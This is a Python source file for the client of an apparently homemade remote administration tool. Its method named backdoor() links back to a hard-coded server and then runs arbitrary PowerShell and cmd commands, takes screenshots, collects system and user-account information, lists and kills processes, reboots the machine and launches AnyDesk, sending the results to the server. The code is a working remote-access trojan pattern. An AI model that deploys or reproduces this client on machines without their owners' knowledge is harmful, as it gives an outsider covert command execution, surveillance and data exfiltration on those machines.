from datetime import datetime
from threading import Thread
from termcolor import colored
import subprocess
import threading
import random
import socket
import shutil
import psutil
import time
import sys
import os

# TODO: DONE: Added client version
# TODO: Install Anydesk Silent Mode


class Client:
    def __init__(self, server, main_path, log_path):
        self.threads = []
        self.log_path = log_path
        self.main_path = main_path
        self.server_host = server[0]
        self.server_port = server[1]
        self.buffer_size = 1024
        self.d = datetime.now()
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        self.current_user = os.getlogin()
        self.hostname = socket.gethostname()
        self.localIP = str(socket.gethostbyname(self.hostname))
        if not os.path.exists(f'{self.main_path}'):
            os.makedirs(self.main_path)

    def connection(self):
        self.logIt_thread(log_path, msg=f'Running connection()...')
        while True:
            time.sleep(1)
            try:
                self.logIt_thread(log_path,
                                  msg=f'Connecting to Server: {self.server_host} | Port {self.server_port}...')
                soc.connect((self.server_host, self.server_port))

            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                continue

    def anydeskThread(self):
        self.logIt_thread(log_path, msg=f'Starting Anydesk app...')
        return subprocess.call([r"C:\Program Files (x86)\AnyDesk\anydesk.exe"])

    def anydesk(self):
        self.logIt_thread(log_path, msg=f'Running anydesk()...')
        try:
            if os.path.exists(r"C:\Program Files (x86)\AnyDesk\anydesk.exe"):
                anydeskThread = threading.Thread(target=self.anydeskThread, name="Run Anydesk")
                anydeskThread.daemon = True
                self.logIt_thread(log_path, msg=f'Calling anydeskThread()...')
                anydeskThread.start()
                self.logIt_thread(log_path, msg=f'Sending Confirmation...')
                soc.send("OK".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

            else:
                error = "Anydesk not installed."
                self.logIt_thread(log_path, msg=f'Sending error message: {error}...')
                soc.send(error.encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')
                return

        except FileNotFoundError as e:
            self.logIt_thread(log_path, msg=f'File Error: {e}')
            return

    def install_anydesk(self):
        self.logIt_thread(log_path, msg=f'Running install_anydesk()...')
        pass

    def screenshot(self):
        def make_script():
            self.logIt_thread(log_path, msg='Running make_script()...')
            self.logIt_thread(log_path, msg=f'Writing script to {self.path}...')
            with open(self.path, 'w') as file:
                file.write("Add-Type -AssemblyName System.Windows.Forms\n")
                file.write("Add-Type -AssemblyName System.Drawing\n\n")
                file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
                file.write("$Width  = $Screen.Width\n")
                file.write("$Height = $Screen.Height\n")
                file.write("$Left = $Screen.Left\n")
                file.write("$Top = $Screen.Top\n\n")
                file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
                file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
                file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
                file.write(rf"$bitmap.Save('{self.filename}')")

            time.sleep(0.2)
            self.logIt_thread(log_path, msg=f'Writing script to {self.path} completed.')

        def run_script():
            self.logIt_thread(log_path, msg='Running run_script()...')
            self.logIt_thread(log_path, msg=f'Running PS script...')
            ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
            ps.communicate()
            self.logIt_thread(log_path, msg=f'PS script Completed.')

        def send_file():
            try:
                # Send filename to server
                self.logIt_thread(log_path, msg='Sending file name to server...')
                soc.send(f"{self.filename}".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

                # Receive filename Confirmation from the server
                self.logIt_thread(log_path, msg='Waiting for confirmation from server...')
                msg = soc.recv(1024).decode()
                self.logIt_thread(log_path, msg=f'Server confirmation: {msg}')
                self.logIt_thread(log_path, msg=f'Getting file size...')
                length = os.path.getsize(self.filename)
                self.logIt_thread(log_path, msg=f'Sending file size to server...')
                soc.send(convert_to_bytes(length))
                self.logIt_thread(log_path, msg=f'Send Completed.')

                # Send file content
                self.logIt_thread(log_path, msg=f'Opening {self.filename} with read bytes permissions...')
                with open(self.filename, 'rb') as img_file:
                    img_data = img_file.read(1024)
                    self.logIt_thread(log_path, msg=f'Sending file content...')
                    while img_data:
                        soc.send(img_data)
                        if not img_data:
                            break

                        img_data = img_file.read(1024)

                self.logIt_thread(log_path, msg=f'Send Completed.')

                return

            except (WindowsError, socket.error, ConnectionError) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        def confirm():
            try:
                self.logIt_thread(log_path, msg=f'Sending confirmation...')
                soc.send('***'.encode())
                time.sleep(0.3)
                soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (WindowsError, socket.error):
                self.logIt_thread(log_path, msg=f'Connection Error')
                return False

        self.logIt_thread(log_path, msg='Running screenshot()...')
        self.logIt_thread(log_path, msg='Calling get_date()...')
        dt = self.get_date()
        self.logIt_thread(log_path, msg='Defining screenshot file name...')
        self.filename = \
            rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {dt}.jpg"
        self.logIt_thread(log_path, msg=f'Screenshot file name: {self.filename}')

        self.logIt_thread(log_path, msg='Defining chunk size...')
        self.chunk = 40960000

        self.logIt_thread(log_path, msg='Creating powershell script file...')
        self.logIt_thread(log_path, msg='Defining script file name...')
        self.path = rf'c:\MekifRemoteAdmin\screenshot.ps1'
        self.logIt_thread(log_path, msg=f'Script file name: {self.path}')

        self.logIt_thread(log_path, msg='Calling make_script()...')
        make_script()
        self.logIt_thread(log_path, msg='Calling run_script()...')
        run_script()
        self.logIt_thread(log_path, msg='Calling send_file()...')
        send_file()
        self.logIt_thread(log_path, msg='Calling confirm()...')
        confirm()

        self.logIt_thread(log_path, msg=f'Removing \n{self.filename} | \n{self.path}...')
        os.remove(self.filename)
        os.remove(self.path)
        self.logIt_thread(log_path, msg=f'=== End of screenshot() ===')

        return

    def system_information(self):
        def command_to_file():
            try:
                self.logIt_thread(log_path, msg='Opening system information file...')
                sysinfo = open(self.sifile, 'w')
                self.logIt_thread(log_path, msg='Running systeminfo command...')
                sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
                sysinfo.write("\n")
                self.logIt_thread(log_path, msg='Running net user command...')
                allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
                sysinfo.write("\n")
                self.logIt_thread(log_path, msg='Closing system information file...')
                sysinfo.close()
                self.logIt_thread(log_path, msg=f'{sysinfo} closed.')

                return True

            except (FileNotFoundError, FileExistsError) as e:
                self.logIt_thread(log_path, msg=f'File Error: {e}')
                return False

        def send_file_name():
            try:
                self.logIt_thread(log_path, msg='Sending file name...')
                soc.send(f"{self.sifile}".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        def send_file_size():
            try:
                self.logIt_thread(log_path, msg='Defining file size...')
                length = os.path.getsize(self.sifile)
                self.logIt_thread(log_path, msg=f'File Size: {length}')

                self.logIt_thread(log_path, msg='Sending file size...')
                soc.send(convert_to_bytes(length))
                self.logIt_thread(log_path, msg=f'Send Completed.')

                return True

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        def send_file_content():
            try:
                self.logIt_thread(log_path, msg=f'Opening {self.sifile}...')
                with open(self.sifile, 'rb') as sy_file:
                    self.logIt_thread(log_path, msg='Sending file content...')
                    sys_data = sy_file.read(1024)
                    while sys_data:
                        soc.send(sys_data)
                        if not sys_data:
                            break

                        sys_data = sy_file.read(1024)

                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (WindowsError, socket.error, FileExistsError, FileNotFoundError) as e:
                self.logIt_thread(log_path, msg=f'Error: {e}')
                return False

        def confirm():
            try:
                self.logIt_thread(log_path, msg='Waiting for message from server...')
                msg = soc.recv(1024).decode()
                self.logIt_thread(log_path, msg=f'From Server: {msg}')

                self.logIt_thread(log_path, msg=f'Sending confirmation message...')
                soc.send(f"{self.hostname} | {self.localIP}: System Information Sent.\n".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        self.logIt_thread(log_path, msg='Calling get_date()...')
        dt = self.get_date()

        self.logIt_thread(log_path, msg='Defining file name...')
        self.sifile = rf"c:\MekifRemoteAdmin\systeminfo {self.hostname} {str(self.localIP)} {dt}.txt"
        self.logIt_thread(log_path, msg=f'File name: {self.sifile}')

        self.logIt_thread(log_path, msg='Calling command_to_file()...')
        command_to_file()
        self.logIt_thread(log_path, msg='Calling send_file_name()...')
        send_file_name()
        self.logIt_thread(log_path, msg='Calling send_file_size()...')
        send_file_size()
        self.logIt_thread(log_path, msg='Calling send_file_content()...')
        send_file_content()
        self.logIt_thread(log_path, msg='Calling confirm()...')
        confirm()

        time.sleep(1)
        self.logIt_thread(log_path, msg='Removing system information file...')
        os.remove(fr'{self.sifile}')
        self.logIt_thread(log_path, msg=f'=== End of system_information() ===')

    def get_date(self):
        d = datetime.now().replace(microsecond=0)
        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))

        return dt

    def send_file(self, filename):
        def send_file_name():
            try:
                self.logIt_thread(log_path, msg='Sending file name...')
                soc.send(filename.encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

                self.logIt_thread(log_path, msg='Waiting for confirmation from server...')
                msg = soc.recv(1024).decode()
                self.logIt_thread(log_path, msg=f'Server Message: {msg}')

                return True

            except (WindowsError, socket.error):
                self.logIt_thread(log_path, msg='Connection Error')
                return False

        def send_file_size():
            self.logIt_thread(log_path, msg='Getting file size...')
            length = os.path.getsize(filename)
            self.logIt_thread(log_path, msg=f'File Size: {length}.')
            try:
                self.logIt_thread(log_path, msg=f'Sending file size: {length}...')
                soc.send(convert_to_bytes(length))
                self.logIt_thread(log_path, msg=f'Send Completed.')

                return length

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        def send_file_content():
            try:
                self.logIt_thread(log_path, msg=f'Opening {filename} with ReadBytes permissions...')
                with open(filename, 'rb') as file:
                    self.logIt_thread(log_path, msg='Reading file content...')
                    data = file.read(1024)
                    self.logIt_thread(log_path, msg='Sending file content...')
                    while data:
                        soc.send(data)
                        if not data:
                            break

                        data = file.read(1024)

                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (FileNotFoundError, FileExistsError) as e:
                self.logIt_thread(log_path, msg=f'File Error: {e}')
                return False

        self.logIt_thread(log_path, msg=f'Running send_file({filename})...')
        self.logIt_thread(log_path, msg='Calling send_file_name()...')
        send_file_name()
        self.logIt_thread(log_path, msg='Calling send_file_size()...')
        send_file_size()
        self.logIt_thread(log_path, msg='Calling send_file_content()...')
        send_file_content()

        self.logIt_thread(log_path, msg=f'=== End of send_file({filename}) ===')

    def execute(self, platform, cmd):
        def run_command():
            if str(platform) == "ps":
                try:
                    self.logIt_thread(log_path, msg=f'Opening {filename}...')
                    with open(filename, 'w') as file:
                        self.logIt_thread(log_path, msg=f'Running PS command: {cmd} to {filename}...')
                        p = subprocess.run([f'{powershell}', f'{cmd}'], stdout=file, shell=True)

                except FileExistsError as e:
                    self.logIt_thread(log_path, msg=f'Passing File Error: {e}...')
                    pass

            elif str(platform) == "cmd":
                try:
                    self.logIt_thread(log_path, msg=f'Opening {filename}...')
                    with open(filename, 'w') as file:
                        self.logIt_thread(log_path, msg=f'Running CMD command: {cmd} to {filename}...')
                        p = subprocess.run(cmd, stdout=file, shell=True)

                    self.logIt_thread(log_path, msg=f'Write to file Completed.')

                except (FileExistsError, IndexError):
                    self.logIt_thread(log_path, msg=f'Passing File Error: {e}...')
                    pass

        def send_file_name():
            try:
                self.logIt_thread(log_path, msg=f'Sending file name: {filename}...')
                soc.send(filename.encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

                self.logIt_thread(log_path, msg=f'Waiting for confirmation...')
                msg = soc.recv(1024).decode()
                self.logIt_thread(log_path, msg=f'Server Confirmation: {msg}')

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Error: {e}')

            return

        def send_file_size():
            self.logIt_thread(log_path, msg=f'Getting file size...')
            length = os.path.getsize(filename)
            self.logIt_thread(log_path, msg=f'File Size: {length}')

            self.logIt_thread(log_path, msg=f'Converting to bytes and sending file size...')
            soc.send(convert_to_bytes(length))
            self.logIt_thread(log_path, msg=f'Send Completed.')

            return length

        def send_file_content():
            try:
                self.logIt_thread(log_path, msg=f'Opening file: {filename}...')
                with open(filename, 'rb') as file:
                    self.logIt_thread(log_path, msg=f'Reading file content...')
                    data = file.read(1024)
                    self.logIt_thread(log_path, msg=f'Sending file content...')
                    while data:
                        soc.send(data)
                        if not data:
                            break

                        data = file.read(1024)

                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (FileNotFoundError, FileExistsError) as e:
                self.logIt_thread(log_path, msg=f'File Error: {e}')
                return False

        def confirm():
            try:
                self.logIt_thread(log_path, msg=f'Waiting for msg from server...')
                msg = soc.recv(1024).decode()
                self.logIt_thread(log_path, msg=f'Server Message: {msg}')

                self.logIt_thread(log_path, msg=f'Sending confirmation to server...')
                soc.send(f"{self.hostname} | {self.localIP}: Command: {cmd} Completed.\n".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        self.logIt_thread(log_path, msg=f'VARS: {platform}, {cmd}')
        self.logIt_thread(log_path, msg='Getting current datetime...')
        dt = self.get_date()

        self.logIt_thread(log_path, msg='Defining file name...')
        filename = rf"c:\MekifRemoteAdmin\{platform} {self.hostname} {str(self.localIP)} {dt}.txt"
        self.logIt_thread(log_path, msg=f'File name: {filename}')

        self.logIt_thread(log_path, msg='Calling run_command()...')
        run_command()

        self.logIt_thread(log_path, msg=f'Calling self.send_file({filename})...')
        self.send_file(filename)

        self.logIt_thread(log_path, msg='Calling confirm()...')
        confirm()

        self.logIt_thread(log_path, msg=f'Removing {filename}...')
        os.remove(filename)

        self.logIt_thread(log_path, msg=f'=== End of execute({platform}, {cmd}) ===')

    def free_style(self):
        while True:
            try:
                self.logIt_thread(log_path, msg='Waiting for platform...')
                plat = soc.recv(1024).decode()
                self.logIt_thread(log_path, msg=f'Received {plat}')

                if str(plat).lower()[:2] == "ps":
                    while True:
                        self.logIt_thread(log_path, msg=f'Waiting for command...')
                        cmd = soc.recv(1024).decode()
                        self.logIt_thread(log_path, msg=f'Command: {cmd}')

                        if cmd == "back":
                            soc.send("OK".encode())
                            return

                        self.logIt_thread(log_path, msg=f'Calling self.execute({plat}, {cmd})...')
                        self.execute("ps", cmd)

                elif str(plat).lower()[:3] == "cmd":
                    while True:
                        self.logIt_thread(log_path, msg=f'Waiting for command...')
                        cmd = soc.recv(1024).decode()

                        if cmd == "back":
                            soc.send("OK".encode())
                            return

                        self.logIt_thread(log_path, msg=f'Calling self.execute({plat}, {cmd})...')
                        self.execute("cmd", cmd)

                elif str(plat).lower() == "instad":
                    self.logIt_thread(log_path, msg=f'Installing Anydesk...')
                    pass

                elif str(plat).lower() == "back":
                    msg = "back".encode()
                    self.logIt_thread(log_path, msg=f'Sending back message to server...')
                    soc.send(msg)
                    self.logIt_thread(log_path, msg=f'Send Completed.')
                    break

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                print(e)
                break

        return

    def tasks(self):
        def command_to_file():
            self.logIt_thread(log_path, msg=f'Running command_to_file()...')
            try:
                self.logIt_thread(log_path, msg=f'Opening file: {self.taskfile}...')
                tskinfo = open(self.taskfile, 'w')

                self.logIt_thread(log_path, msg=f'Writing output to {self.taskfile}...')
                sinfo = subprocess.call(['tasklist'], stdout=tskinfo)
                tskinfo.write("\n")
                self.logIt_thread(log_path, msg=f'Closing file: {self.taskfile}...')
                tskinfo.close()
                self.logIt_thread(log_path, msg=f'File closed.')

                return True

            except (FileNotFoundError, FileExistsError) as e:
                self.logIt_thread(log_path, msg=f'File Error: {e}')
                return False

        def send_file_name():
            self.logIt_thread(log_path, msg=f'Running send_file_name()...')
            try:
                self.logIt_thread(log_path, msg=f'Sending file name: {self.taskfile}...')
                soc.send(f"{self.taskfile}".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')
                return True

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        def print_file_content():
            self.logIt_thread(log_path, msg=f'Running print_file_content()...')
            self.logIt_thread(log_path, msg=f'Opening file: {self.taskfile}...')
            with open(self.taskfile, 'r') as file:
                self.logIt_thread(log_path, msg=f'Adding content to list...')
                for line in file.readlines():
                    task_list.append(line)

            self.logIt_thread(log_path, msg=f'Printing content from list...')
            for t in task_list:
                print(t)

        def send_file_size():
            self.logIt_thread(log_path, msg=f'Running send_file_size()...')
            self.logIt_thread(log_path, msg=f'Defining file size...')
            length = os.path.getsize(self.taskfile)
            self.logIt_thread(log_path, msg=f'File Size: {length}')

            try:
                self.logIt_thread(log_path, msg=f'Sending file size...')
                soc.send(convert_to_bytes(length))
                self.logIt_thread(log_path, msg=f'Send Completed.')
                return True

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        def send_file_content():
            self.logIt_thread(log_path, msg=f'Running send_file_content()...')
            self.logIt_thread(log_path, msg=f'Opening file: {self.taskfile}...')
            with open(self.taskfile, 'rb') as tsk_file:
                self.logIt_thread(log_path, msg=f'Reading content from {self.taskfile}...')
                tsk_data = tsk_file.read(1024)
                try:
                    self.logIt_thread(log_path, msg=f'Sending file content...')
                    while tsk_data:
                        soc.send(tsk_data)
                        if not tsk_data:
                            break

                        tsk_data = tsk_file.read(1024)

                    self.logIt_thread(log_path, msg=f'Send Completed.')

                except (WindowsError, socket.error) as e:
                    self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                    return False

        def confirm():
            self.logIt_thread(log_path, msg=f'Running confirm()...')
            try:
                self.logIt_thread(log_path, msg=f'Waiting for confirmation from server...')
                msg = soc.recv(1024).decode()
                self.logIt_thread(log_path, msg=f'Server Confirmation: {msg}')

                self.logIt_thread(log_path, msg=f'Sending confirmation...')
                soc.send(f"{self.hostname} | {self.localIP}: Task List Sent.\n".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

        def kill():
            try:
                self.logIt_thread(log_path, msg=f'Waiting for task name...')
                task2kill = soc.recv(1024).decode()
                self.logIt_thread(log_path, msg=f'Task name: {task2kill}')

                if str(task2kill).lower()[:1] == 'q':
                    return

                self.logIt_thread(log_path, msg=f'Killing {task2kill}...')
                os.system(f'taskkill /IM {task2kill} /F')
                self.logIt_thread(log_path, msg=f'{task2kill} killed.')

                self.logIt_thread(log_path, msg=f'Sending killed confirmation to server...')
                soc.send(f"Task: {task2kill} Killed.".encode())
                self.logIt_thread(log_path, msg=f'Send Completed.')

            except (WindowsError, socket.error) as e:
                self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                return False

            return

        self.logIt_thread(log_path, msg=f'Defining tasks file name...')
        dt = self.get_date()
        self.taskfile = rf"c:\MekifRemoteAdmin\tasks {self.hostname} {str(self.localIP)} {dt}.txt"
        self.logIt_thread(log_path, msg=f'Tasks file name: {self.taskfile}')

        self.logIt_thread(log_path, msg=f'Calling command_to_file()...')
        command_to_file()
        self.logIt_thread(log_path, msg=f'Calling send_file_name()...')
        send_file_name()
        self.logIt_thread(log_path, msg=f'Calling print_file_content()...')
        print_file_content()
        self.logIt_thread(log_path, msg=f'Calling send_file_size()...')
        send_file_size()
        self.logIt_thread(log_path, msg=f'Calling send_file_content()...')
        send_file_content()
        self.logIt_thread(log_path, msg=f'Calling confirm()...')
        confirm()

        self.logIt_thread(log_path, msg=f'Removing file: {self.taskfile}...')
        os.remove(self.taskfile)

        kil = soc.recv(1024).decode()
        if str(kil)[:4].lower() == "kill":
            self.logIt_thread(log_path, msg=f'Calling kill()...')
            kill()

        else:
            return False

    def backdoor(self, soc):
        def intro():
            def send_host_name():
                ident = self.hostname
                try:
                    self.logIt_thread(log_path, msg=f'Sending hostname: {self.hostname}...')
                    soc.send(ident.encode())
                    self.logIt_thread(log_path, msg=f'Send completed.')
                    self.logIt_thread(log_path, msg='Waiting for confirmation from server...')
                    message = soc.recv(self.buffer_size).decode()
                    self.logIt_thread(log_path, msg=f'Message from server: {message}')

                except (WindowsError, socket.error):
                    self.logIt_thread(log_path, msg='Connection Error')
                    return False

            def send_current_user():
                user = self.current_user
                try:
                    self.logIt_thread(log_path, msg=f'Sending current user: {user}...')
                    soc.send(user.encode())
                    self.logIt_thread(log_path, msg=f'Send completed.')
                    self.logIt_thread(log_path, msg='Waiting for confirmation from server...')
                    message = soc.recv(self.buffer_size).decode()
                    self.logIt_thread(log_path, msg=f'Message from server: {message}')

                except (WindowsError, socket.error):
                    return False

            def send_client_version():
                try:
                    self.logIt_thread(log_path, msg=f'Sending client version: {client_version}...')
                    soc.send(client_version.encode())
                    self.logIt_thread(log_path, msg=f'Send completed.')
                    self.logIt_thread(log_path, msg='Waiting for confirmation from server...')
                    message = soc.recv(self.buffer_size).decode()
                    self.logIt_thread(log_path, msg=f'Message from server: {message}')

                except (socket.error, WindowsError) as e:
                    return False

            def confirm():
                try:
                    self.logIt_thread(log_path, msg='Waiting for confirmation from server...')
                    message = soc.recv(self.buffer_size).decode()
                    self.logIt_thread(log_path, msg=f'Message from server: {message}')

                except (WindowsError, socket.error):
                    self.logIt_thread(log_path, msg='Connection Error')
                    return False

            self.logIt_thread(log_path, msg='Calling send_host_name()...')
            send_host_name()
            self.logIt_thread(log_path, msg='Calling send_current_user()...')
            send_current_user()
            self.logIt_thread(log_path, msg='Calling send_client_version()...')
            send_client_version()
            # self.logIt_thread(log_path, msg='Calling confirm()...')
            # confirm()

        def main_menu():
            self.logIt_thread(log_path, msg='Starting main menu...')
            while True:
                try:
                    self.logIt_thread(log_path, msg='Waiting for command...')
                    command = soc.recv(self.buffer_size).decode()
                    self.logIt_thread(log_path, msg=f'Server Command: {command}')

                except (ConnectionResetError, ConnectionError,
                        ConnectionAbortedError, WindowsError, socket.error) as e:
                    self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                    break

                try:
                    if len(str(command)) == 0:
                        self.logIt_thread(log_path, msg='Connection Lost')
                        break

                    # Freestyle
                    if str(command.lower())[:9] == "freestyle":
                        self.logIt_thread(log_path, msg='Calling freestyle...')
                        self.free_style()

                    # Vital Signs
                    if str(command.lower())[:5] == "alive":
                        self.logIt_thread(log_path, msg='Calling Vital Signs...')
                        try:
                            self.logIt_thread(log_path, msg='Answer yes to server')
                            soc.send('yes'.encode())
                            self.logIt_thread(log_path, msg=f'Send completed.')

                            self.logIt_thread(log_path, msg='Sending client version to server...')
                            soc.send(client_version.encode())
                            self.logIt_thread(log_path, msg=f'Send completed.')

                        except socket.error:
                            break

                    # Capture Screenshot
                    elif str(command.lower())[:6] == "screen":
                        self.logIt_thread(log_path, msg='Calling screenshot...')
                        self.screenshot()

                    # Get System Information & Users
                    elif str(command.lower())[:2] == "si":
                        self.logIt_thread(log_path, msg='Calling system information...')
                        self.system_information()

                    # Get Last Restart Time
                    elif str(command.lower())[:2] == "lr":
                        self.logIt_thread(log_path, msg='Fetching last restart time...')
                        last_reboot = psutil.boot_time()
                        try:
                            self.logIt_thread(log_path, msg='Sending last restart time...')
                            soc.send(f"{self.hostname} | {self.localIP}: "
                                     f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}".encode())

                            self.logIt_thread(log_path, msg=f'Send completed.')

                        except ConnectionResetError as e:
                            self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                            break

                    # Get Current Logged-on User
                    elif str(command.lower())[:4] == "user":
                        try:
                            self.logIt_thread(log_path, msg=f'Sending current logged user: {self.current_user}...')
                            soc.send(f"{self.hostname} | {self.localIP}: Current User: {self.current_user}.\n".encode())

                            continue

                        except ConnectionResetError:
                            break

                    # Run Anydesk
                    elif str(command.lower())[:7] == "anydesk":
                        self.logIt_thread(log_path, msg='Calling anydesk()...')
                        self.anydesk()
                        continue

                    # Task List
                    elif str(command.lower())[:5] == "tasks":
                        self.logIt_thread(log_path, msg='Calling tasks()...')
                        self.tasks()

                    # Restart Machine
                    elif str(command.lower())[:7] == "restart":
                        self.logIt_thread(log_path, msg='Restarting local station...')
                        os.system('shutdown /r /t 1')

                    # Run Updater
                    elif str(command.lower())[:6] == "update":
                        soc.send('update command received'.encode())
                        pass

                    # Close Connection
                    elif str(command.lower())[:4] == "exit":
                        self.logIt_thread(log_path, msg='Server closed the connection.')
                        soc.settimeout(1)
                        sys.exit(0)     # CI CD

                except (Exception, socket.error) as err:
                    self.logIt_thread(log_path, msg=f'Connection Error: {e}')
                    break

        self.logIt_thread(log_path, msg='Calling intro()...')
        intro()
        self.logIt_thread(log_path, msg='Calling main_menu()...')
        main_menu()

        return True

    def logIt(self, logfile=None, debug=None, msg=''):
        dt = self.get_date()
        if debug:
            print(f"{dt}: {msg}")

        if logfile is not None:
            try:
                if not os.path.exists(logfile):
                    with open(logfile, 'w') as lf:
                        lf.write(f"{dt}: {msg}\n")
                        return True

                else:
                    with open(logfile, 'a') as lf:
                        lf.write(f"{dt}: {msg}\n")
                    return True

            except FileExistsError:
                pass

    def logIt_thread(self, log_path=None, debug=False, msg=''):
        self.logit_thread = Thread(target=self.logIt, args=(log_path, debug, msg), name="Log Thread")
        self.logit_thread.start()
        self.threads.append(self.logit_thread)
        return


def convert_to_bytes(no):
    result = bytearray()
    result.append(no & 255)
    for i in range(3):
        no = no >> 8
        result.append(no & 255)
    return result


def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i * 8)
    return res


if __name__ == "__main__":
    client_version = "1.0.0"
    task_list = []
    powershell = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    app_path = r'c:\Peach'
    log_path = fr'{app_path}\client_log.txt'
    servers = [('192.168.1.10', 55400)]

    # Start Client
    while True:
        for server in servers:
            client = Client(server, app_path, log_path)

            try:
                client.logIt_thread(log_path, msg='Creating Socket...')
                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.logIt_thread(log_path, msg='Defining socket to Reuse address...')
                soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                client.logIt_thread(log_path, msg=f'connecting to {server}...')
                soc.connect(server)
                client.logIt_thread(log_path, msg=f'Calling backdoor()...')
                client.backdoor(soc)

            except (WindowsError, socket.error) as e:
                client.logIt_thread(log_path, msg=f'Connection Error: {e}')
                soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                client.logIt_thread(log_path, msg=f'Closing socket...')
                soc.close()
                time.sleep(1)
